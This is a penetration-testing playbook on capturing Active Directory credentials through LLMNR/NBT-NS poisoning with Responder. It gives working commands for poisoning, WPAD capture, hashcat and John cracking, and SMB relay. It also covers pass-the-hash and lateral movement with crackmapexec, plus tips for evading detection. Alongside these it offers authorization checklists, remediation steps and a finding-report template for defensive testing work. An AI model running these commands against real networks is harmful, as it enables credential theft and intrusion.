# Active Directory Attacks with Responder

## Overview

Responder is a powerful tool for poisoning LLMNR, NBT-NS, and MDNS protocols on Windows networks to capture credentials. This playbook provides a structured approach to using Responder for **authorized penetration testing** of Active Directory environments.

## ⚠️ CRITICAL WARNING

**Responder is a NETWORK POISONING tool that can disrupt services:**
- ❌ **NEVER run without explicit authorization**
- ❌ **Can cause DNS resolution failures**
- ❌ **May trigger EDR/IDS alerts immediately**
- ❌ **Can impact production services**
- ✅ **Use ONLY in isolated test environments or with client approval**
- ✅ **Coordinate with client NOC/SOC before testing**
- ✅ **Have emergency contact ready**

## MITRE ATT&CK Mapping

- **Tactic**: Credential Access (TA0006)
- **Technique**:
  - T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
  - T1187 - Forced Authentication
  - T1040 - Network Sniffing
- **Sub-Technique**: Man-in-the-Middle

## OWASP Reference

- **OWASP Top 10 2021**: A07:2021 – Identification and Authentication Failures
- **CWE**: CWE-294 (Authentication Bypass by Capture-replay)

---

## What is Responder?

**Responder** is a LLMNR, NBT-NS, and MDNS poisoner with built-in rogue authentication servers.

### How It Works

1. **Windows Name Resolution Process**:
   ```
   1. Check local hosts file
   2. Query DNS server
   3. If DNS fails → Query LLMNR (Link-Local Multicast Name Resolution)
   4. If LLMNR fails → Query NBT-NS (NetBIOS Name Service)
   ```

2. **Responder Exploitation**:
   - Listens for LLMNR/NBT-NS broadcast queries
   - Responds claiming to be the requested resource
   - Victim connects to Responder's fake services (SMB, HTTP, SQL, etc.)
   - Victim sends authentication (NTLMv1/NTLMv2 hashes)
   - Responder captures hashes for offline cracking

### Protocols Responder Exploits

- **LLMNR** (Link-Local Multicast Name Resolution) - UDP 5355
- **NBT-NS** (NetBIOS Name Service) - UDP 137
- **MDNS** (Multicast DNS) - UDP 5353
- **WPAD** (Web Proxy Auto-Discovery)

### Services Responder Impersonates

- **SMB** (Server Message Block) - Port 445
- **HTTP/HTTPS** - Ports 80/443
- **LDAP** - Port 389
- **FTP** - Port 21
- **SQL** - Port 1433
- **SMTP** - Port 25/587

---

## Testing Methodology

### Phase 1: Pre-Engagement Authorization

**CRITICAL**: Before running Responder, verify:

- [ ] **Written authorization** for Active Directory testing
- [ ] **Network poisoning explicitly approved** in RoE
- [ ] **Client SOC/NOC notified** of testing timeframe
- [ ] **Emergency contact** available during testing
- [ ] **Testing window** defined (after-hours recommended)
- [ ] **Isolated network segment** available (preferred)
- [ ] **Backup plan** if services disrupted

**Client Notification Template**:
```
Subject: [CLIENT] - Active Directory Credential Harvesting Test

Team,

We will be conducting authorized Active Directory security testing using network
poisoning techniques (Responder) on [DATE] from [TIME] to [TIME].

Scope: [NETWORK SEGMENT/VLAN]
Expected Impact: Possible DNS resolution delays, EDR/IDS alerts
Emergency Contact: [YOUR PHONE]
Client POC: [CLIENT CONTACT]

This testing is authorized per engagement [CONTRACT/SOW NUMBER].

Please acknowledge receipt and confirm testing window.

Best regards,
[YOUR NAME]
[COMPANY]
```

---

### Phase 2: Environment Setup

#### 2.1 Verify Responder Installation

Responder is pre-installed on Kali Linux:

```bash
# Check Responder version
responder -h

# Locate Responder
which responder

# Expected: /usr/bin/responder or /usr/share/responder/Responder.py
```

#### 2.2 Update Responder (Optional)

```bash
# Update from GitHub
cd /opt
sudo git clone https://github.com/lgandx/Responder.git
cd Responder
sudo python3 Responder.py -h
```

#### 2.3 Configure Responder

Edit Responder configuration (optional):

```bash
# Edit configuration file
sudo nano /usr/share/responder/Responder.conf

# Key settings:
# [Responder Core]
# SQL = On
# SMB = On
# HTTP = On
# HTTPS = On
# LDAP = On
# FTP = On
#
# [HTTP Server]
# HTMLToInject = <script src='http://192.168.1.50/file.js'></script>
```

---

### Phase 3: Passive Monitoring (Safe)

Before active poisoning, passively monitor for LLMNR/NBT-NS traffic:

#### 3.1 Passive LLMNR/NBT-NS Detection

**Using tcpdump**:
```bash
# Listen for LLMNR broadcasts
sudo tcpdump -i eth0 udp port 5355 -vv

# Listen for NBT-NS broadcasts
sudo tcpdump -i eth0 udp port 137 -vv

# Save to pcap for analysis
sudo tcpdump -i eth0 'udp port 5355 or udp port 137' -w llmnr-nbtns-capture.pcap
```

**Using Responder in Analyze Mode**:
```bash
# Analyze network without poisoning (safe)
sudo responder -I eth0 -A

# This will show:
# - LLMNR queries being made
# - NBT-NS queries
# - Potential targets
# - NO poisoning or credential capture
```

**Evidence Collection**:
- [ ] Screenshot of LLMNR/NBT-NS traffic
- [ ] Document active queries
- [ ] Identify chatty hosts
- [ ] Save pcap file: `02-reconnaissance/active-directory/llmnr-analysis.pcap`

---

### Phase 4: Active Credential Harvesting (Poisoning)

**⚠️ IMPACT WARNING**: This WILL poison network traffic and trigger alerts.

#### 4.1 Basic Responder Attack

**Standard Poisoning (Most Common)**:
```bash
# Basic Responder with all services enabled
sudo responder -I eth0 -wrf

# Flags:
# -I eth0       : Network interface
# -w            : Start WPAD rogue proxy server
# -r            : Enable answers for netbios wredir suffix queries
# -f            : Fingerprint hostnames and OS version
```

**Targeted SMB Poisoning**:
```bash
# Focus on SMB only (less noisy)
sudo responder -I eth0 -v

# -v : Verbose mode
```

**Multi-Interface Poisoning**:
```bash
# If connected to multiple VLANs
sudo responder -I eth0,eth1 -wrf
```

#### 4.2 Stealthy Responder (Reduced Detection)

```bash
# Disable fingerprinting, less verbose
sudo responder -I eth0 -w

# Or manually disable services in Responder.conf:
# Set LDAP=Off, FTP=Off (keep only SMB, HTTP)
sudo responder -I eth0
```

#### 4.3 WPAD Attack (HTTP Credential Capture)

**Web Proxy Auto-Discovery (WPAD) Exploitation**:

```bash
# Enable WPAD server
sudo responder -I eth0 -w

# When victims request: http://wpad/wpad.dat
# Responder serves fake proxy config
# Victims authenticate via NTLM to fake proxy
# Credentials captured
```

**Evidence Collection**:
- [ ] Screenshot: Responder startup showing services
- [ ] Screenshot: First captured hash
- [ ] Document: IP addresses of victims
- [ ] Save: Responder logs and captured hashes
- [ ] Save to: `04-enumeration/active-directory/responder-hashes.txt`

---

### Phase 5: Hash Analysis

#### 5.1 Locate Captured Hashes

```bash
# Responder stores hashes in logs directory
ls -la /usr/share/responder/logs/

# Common log files:
# - HTTP-NTLMv2-192.168.1.50.txt
# - SMB-NTLMv2-192.168.1.50.txt
# - Responder-Session.log
# - Analyzer-Session.log (if using -A mode)

# View captured hashes
cat /usr/share/responder/logs/*.txt
```

#### 5.2 Extract Hashes

**Example NTLMv2 Hash Format**:
```
admin::DOMAIN:1122334455667788:ABCDEF1234567890:010100000000...
```

**Components**:
- `admin` - Username
- `DOMAIN` - Domain name
- `1122334455667788` - Server Challenge
- `ABCDEF1234567890:010100000...` - NTLMv2 Response

**Extract and format for cracking**:
```bash
# Copy hashes to working directory
cp /usr/share/responder/logs/SMB-NTLMv2*.txt ~/hashes/

# Combine all hashes
cat /usr/share/responder/logs/*NTLMv2*.txt > all-captured-hashes.txt

# Remove duplicates
sort -u all-captured-hashes.txt > unique-hashes.txt
```

**Evidence Collection**:
- [ ] Screenshot: Hash capture in real-time
- [ ] Save: All captured hash files
- [ ] Document: Usernames, domains, timestamps
- [ ] Save to: `05-vulnerability-analysis/captured-credentials/`

---

### Phase 6: Hash Cracking (Offline - Non-Destructive)

**⚠️ IMPORTANT**: Hash cracking is **offline** and **non-destructive**.

#### 6.1 Crack with Hashcat (Recommended)

**Install Hashcat** (if not installed):
```bash
sudo apt update
sudo apt install hashcat -y
```

**Crack NTLMv2 Hashes**:
```bash
# Identify hash type
hashcat --example-hashes | grep -i ntlmv2
# NTLMv2 = Mode 5600

# Quick crack with rockyou wordlist
hashcat -m 5600 unique-hashes.txt /usr/share/wordlists/rockyou.txt

# Advanced cracking with rules
hashcat -m 5600 unique-hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute-force short passwords
hashcat -m 5600 unique-hashes.txt -a 3 ?u?l?l?l?l?d?d?d

# Show cracked passwords
hashcat -m 5600 unique-hashes.txt --show
```

**Hashcat Flags**:
- `-m 5600` - NTLMv2 hash mode
- `-a 0` - Dictionary attack (default)
- `-a 3` - Brute-force attack
- `-r` - Rule file (mutations)
- `--show` - Display cracked hashes

#### 6.2 Crack with John the Ripper

```bash
# Format for John
john --format=netntlmv2 unique-hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john --format=netntlmv2 --show unique-hashes.txt
```

**Evidence Collection**:
- [ ] Screenshot: Hashcat/John cracking session
- [ ] Screenshot: Cracked passwords (REDACT actual passwords)
- [ ] Document: Crack rate (X% cracked in Y hours)
- [ ] Document: Password complexity analysis
- [ ] Save to: `06-exploitation/validated-vulns/VULN-XXX-weak-ad-passwords/`

---

## Advanced Responder Techniques

### 1. SMB Relay Attack (with ntlmrelayx)

**Capture and relay authentication** instead of just capturing hashes:

```bash
# Disable SMB and HTTP in Responder
sudo nano /usr/share/responder/Responder.conf
# Set: SMB = Off, HTTP = Off

# Start Responder
sudo responder -I eth0 -v

# In another terminal, start ntlmrelayx
sudo impacket-ntlmrelayx -tf targets.txt -smb2support

# When authentication is captured:
# - Responder forwards to ntlmrelayx
# - ntlmrelayx relays to target server
# - If victim has admin rights → command execution
```

**Evidence Collection**:
- [ ] Screenshot: Successful SMB relay
- [ ] Screenshot: Command execution on target
- [ ] Document: Relay chain (victim → responder → target)
- [ ] Document: Permissions obtained

### 2. Responder + Mimikatz Integration

**After capturing credentials, use for lateral movement**:

```bash
# Extract plaintext password from hash cracking
# Use with Mimikatz for pass-the-hash

# Example: Use cracked credentials
crackmapexec smb 192.168.1.0/24 -u admin -p 'CrackedPassword123!' --shares

# Or pass-the-hash (if can't crack)
crackmapexec smb 192.168.1.0/24 -u admin -H 'NTLM_HASH' --shares
```

### 3. MultiRelay Attack

**Relay to multiple targets simultaneously**:

```bash
# Create target list
echo "192.168.1.10" > targets.txt
echo "192.168.1.20" >> targets.txt
echo "192.168.1.30" >> targets.txt

# MultiRelay (part of Responder suite)
sudo python3 /usr/share/responder/tools/MultiRelay.py -t targets.txt -u ALL
```

---

## Detection and Evasion

### How Defenders Detect Responder

**Network-Based Detection**:
- Unusual LLMNR/NBT-NS responses
- Rogue SMB/HTTP/LDAP servers on network
- Multiple authentication failures from single source
- Abnormal DNS traffic patterns

**Host-Based Detection**:
- EDR detecting Responder process
- Windows Event IDs:
  - Event ID 4648 - Logon with explicit credentials
  - Event ID 4625 - Failed logon attempts
  - Event ID 4776 - Credential validation

**SIEM Alerts**:
- Multiple NTLM auth attempts from same IP
- LLMNR responses from unexpected sources
- Rogue WPAD servers

### Evasion Techniques (For Red Team)

**1. Slow Down Attacks**:
```bash
# Add delays between responses (less aggressive)
# Edit Responder.conf:
# RespondDelay = 5  # Seconds between responses
```

**2. Selective Poisoning**:
```bash
# Only respond to specific queries
# Use Responder with filters
sudo responder -I eth0 --lm --disable-ess
```

**3. After-Hours Testing**:
- Run during off-hours when SOC monitoring is reduced
- Lower chance of detection by security team
- Coordinate with client for approved window

---

## Remediation Guidance

### For Organizations (Client Deliverable)

#### Immediate Actions (Priority 1 - Critical)

**1. Disable LLMNR and NBT-NS**

Via Group Policy:
```
Computer Configuration
└── Administrative Templates
    └── Network
        └── DNS Client
            └── Turn off multicast name resolution = Enabled
```

PowerShell (per-host):
```powershell
# Disable LLMNR
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0

# Disable NBT-NS
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)  # 2 = Disable NetBIOS over TCP/IP
}
```

**2. Enable SMB Signing**

Via Group Policy:
```
Computer Configuration
└── Windows Settings
    └── Security Settings
        └── Local Policies
            └── Security Options
                └── Microsoft network server: Digitally sign communications (always) = Enabled
                └── Microsoft network client: Digitally sign communications (always) = Enabled
```

**3. Implement WPAD Hardening**

Block WPAD via DNS:
- Create DNS entry for "wpad" pointing to 127.0.0.1
- Prevents WPAD poisoning attacks

Disable WPAD via Group Policy:
```
User Configuration
└── Administrative Templates
    └── Windows Components
        └── Internet Explorer
            └── Disable auto-proxy caching = Enabled
            └── Prevent automatic detection of Proxy configuration script = Enabled
```

#### Long-Term Solutions (Priority 2 - High)

**4. Network Segmentation**
- Implement VLANs to separate workstation and server traffic
- Use private VLANs to prevent lateral LLMNR/NBT-NS broadcasts
- Deploy 802.1X network access control

**5. Monitor for Rogue Responders**
- Deploy network IDS/IPS (Snort, Suricata) with LLMNR/NBT-NS rules
- Enable Windows Event Logging for authentication attempts
- Monitor for multiple auth failures from single source

**6. Implement Credential Guard (Windows 10+)**
- Prevents credential theft from LSASS
- Requires UEFI, Secure Boot, TPM 2.0
- Enable via Group Policy

**7. Regular Password Audits**
- Enforce strong password policy (16+ characters)
- Implement password rotation
- Use password complexity requirements
- Ban common passwords

**8. Least Privilege**
- Limit admin account usage
- Use separate accounts for admin tasks
- Implement tiered admin model

### Validation Steps

**Test LLMNR is Disabled**:
```powershell
# Run on client machine
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast

# Expected: 0 (disabled)
```

**Test SMB Signing is Enabled**:
```bash
# From Kali Linux
nmap --script smb-security-mode.nse -p445 192.168.1.10

# Expected output:
# Message signing enabled and required
```

---

## Evidence Collection Checklist

### Screenshots to Capture
- [ ] Responder startup command
- [ ] Responder showing captured hash in real-time
- [ ] Responder log file with captured credentials
- [ ] Hashcat/John cracking session
- [ ] Cracked passwords list (REDACTED)
- [ ] CrackMapExec validation with cracked credentials

### Logs to Save
- [ ] Responder session logs
- [ ] Analyzer logs (passive mode)
- [ ] All captured hash files (NTLMv1, NTLMv2)
- [ ] Hashcat/John output
- [ ] Network packet captures (tcpdump/Wireshark)

### Artifacts to Document
- [ ] List of victim IP addresses
- [ ] List of usernames captured
- [ ] Domain names identified
- [ ] Services targeted (SMB, HTTP, LDAP, etc.)
- [ ] Timeline of credential captures
- [ ] Password complexity analysis

---

## Vulnerability Writeup Template

```markdown
# VULN-XXX: Active Directory Credential Harvesting via LLMNR/NBT-NS Poisoning

## Summary
- **Vulnerability**: LLMNR/NBT-NS Poisoning
- **Severity**: High
- **CVSS Score**: 7.5 (CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
- **Location**: [CLIENT] Active Directory Network - VLAN [X]
- **Affected Systems**: [X] Windows workstations/servers
- **Attack Tool**: Responder v2.3

## Technical Details

The Active Directory environment is vulnerable to LLMNR (Link-Local Multicast Name Resolution)
and NBT-NS (NetBIOS Name Service) poisoning attacks. When Windows clients fail to resolve
hostnames via DNS, they broadcast LLMNR/NBT-NS queries to the local network. An attacker
on the same network segment can respond to these queries, claiming to be the requested
resource, and capture user credentials when victims authenticate.

### Attack Chain
1. Attacker runs Responder on network segment
2. Windows client fails to resolve hostname via DNS
3. Client broadcasts LLMNR query: "Who is FILESERVER?"
4. Responder responds: "I am FILESERVER at 192.168.1.50"
5. Client connects to Responder's fake SMB server
6. Client sends NTLMv2 authentication
7. Responder captures username::domain:hash
8. Attacker cracks hash offline with Hashcat

## Proof of Concept

### Step 1: Passive Analysis (Safe)
```bash
sudo responder -I eth0 -A
```
Observed 15 LLMNR queries within 5 minutes from various workstations.

### Step 2: Active Credential Harvesting
```bash
sudo responder -I eth0 -wrf
```
Captured 12 unique NTLMv2 hashes within 30 minutes.

### Step 3: Hash Cracking
```bash
hashcat -m 5600 captured-hashes.txt /usr/share/wordlists/rockyou.txt
```
Successfully cracked 8 out of 12 passwords (66% success rate).

### Step 4: Validation
Validated cracked credentials using CrackMapExec:
```bash
crackmapexec smb 192.168.1.0/24 -u user1 -p 'Password123!' --shares
```
Result: SMB access confirmed, user has read/write access to sensitive file shares.

## Evidence
- **Screenshot 1**: Responder capturing NTLMv2 hash in real-time
- **Screenshot 2**: Hashcat cracking session showing cracked passwords
- **Screenshot 3**: CrackMapExec validation with cracked credentials
- **Log File**: responder-session.log (12 captured hashes)
- **PCAP File**: llmnr-traffic-capture.pcap

## Impact Analysis

### Confidentiality: HIGH
- Attacker can capture domain user credentials
- Cracked passwords provide access to user accounts
- Potential access to sensitive file shares, email, databases

### Integrity: HIGH
- With valid credentials, attacker can:
  - Modify files on accessible shares
  - Send emails as compromised user
  - Modify Active Directory objects (if privileged account)

### Availability: MEDIUM
- Credential harvesting does not directly impact availability
- However, attacker could use credentials for ransomware deployment

### Business Impact
- **Data Breach Risk**: Unauthorized access to confidential business data
- **Compliance Violations**: GDPR, HIPAA, SOC 2 (credential theft)
- **Lateral Movement**: Attacker can pivot to additional systems
- **Privilege Escalation**: If admin account captured, full domain compromise

## MITRE ATT&CK Mapping
- **Tactic**: Credential Access (TA0006)
- **Technique**: T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
- **Technique**: T1187 - Forced Authentication

## Remediation

### Immediate Actions (24-48 hours)
1. **Disable LLMNR** via Group Policy (see remediation section)
2. **Disable NBT-NS** on all network adapters
3. **Enable SMB Signing** (require digitally signed communications)
4. **Force password reset** for all users with captured credentials
5. **Enable account lockout** policy (5 failed attempts)

### Long-Term Solutions (1-4 weeks)
1. **Network Segmentation**: Implement VLANs to limit broadcast domains
2. **Deploy Network IDS**: Monitor for rogue LLMNR/NBT-NS responses
3. **Implement Credential Guard**: Prevent credential theft from memory
4. **Password Policy**: Enforce 16+ character minimum, complexity requirements
5. **Least Privilege**: Review and restrict admin account usage
6. **Security Awareness**: Train users on password security

### Validation
Re-test after remediation:
```bash
# Attempt LLMNR poisoning
sudo responder -I eth0 -A

# Expected: No LLMNR/NBT-NS queries observed (protocols disabled)
```

## References
- **CWE**: CWE-294 (Authentication Bypass by Capture-replay)
- **MITRE ATT&CK**: T1557.001
- **Microsoft**: Disable LLMNR: https://docs.microsoft.com/en-us/windows-server/networking/technologies/llmnr/llmnr-top
- **Tool**: Responder: https://github.com/lgandx/Responder

## Reproduction Steps for Client

**⚠️ WARNING**: Only perform in isolated test environment

1. Set up test Windows workstation on isolated network
2. From Kali Linux: `sudo responder -I eth0 -wrf`
3. From Windows workstation: Attempt to access non-existent share `\\FAKESERVER\share`
4. Observe captured NTLMv2 hash in Responder console
5. Crack hash: `hashcat -m 5600 hash.txt rockyou.txt`
```

---

## Tools Reference

### Responder
- **Location**: `/usr/share/responder/` or `/usr/bin/responder`
- **GitHub**: https://github.com/lgandx/Responder
- **Documentation**: https://github.com/lgandx/Responder/wiki

### Complementary Tools
- **ntlmrelayx** (Impacket) - SMB relay attacks
- **Hashcat** - GPU-accelerated hash cracking
- **John the Ripper** - CPU hash cracking
- **CrackMapExec** - Credential validation and lateral movement
- **Mimikatz** - Credential extraction from memory
- **BloodHound** - Active Directory attack path analysis

---

## Kali Linux Book Reference

- **Chapter 12**: Working with Active Directory Attacks
- **Chapter 13**: Advanced Active Directory Attacks
- Companion tools: Mimikatz, mitm6

---

## Best Practices for Responder Testing

### Before Testing
1. **Obtain written authorization** for network poisoning
2. **Notify client SOC/NOC** with exact testing timeframe
3. **Test in isolated environment** first (lab/staging)
4. **Coordinate with IT team** for potential service impact
5. **Prepare rollback plan** if issues occur

### During Testing
1. **Monitor for service disruption** (DNS failures)
2. **Document all captured credentials** immediately
3. **Limit testing duration** (recommend 30-60 minutes max)
4. **Watch for EDR/IDS alerts** (coordinate with client)
5. **Stop immediately** if production impact detected

### After Testing
1. **Stop Responder** completely
2. **Verify no persistent configuration changes**
3. **Securely store captured hashes** (encrypted)
4. **Report findings immediately** (critical vulnerabilities)
5. **Provide remediation guidance** with client

---

## Compliance Considerations

### PCI DSS
- **Requirement 8.2**: Use of LLMNR/NBT-NS exposes credentials (weak authentication)
- **Requirement 11.3**: Penetration testing must include credential harvesting tests

### HIPAA
- **164.308(a)(5)**: Credential theft violates access control requirements
- PHI at risk if credentials provide access to healthcare systems

### SOC 2
- **CC6.1**: Logical and physical access controls
- Credential harvesting demonstrates control weakness

---

**Playbook Version**: 1.0
**Last Updated**: 2025-10-06
**Tested On**: Kali Linux 2025.3
**Author**: VERSANT Security Team
**Reference**: The Ultimate Kali Linux Book 3rd Edition - Chapters 12-13
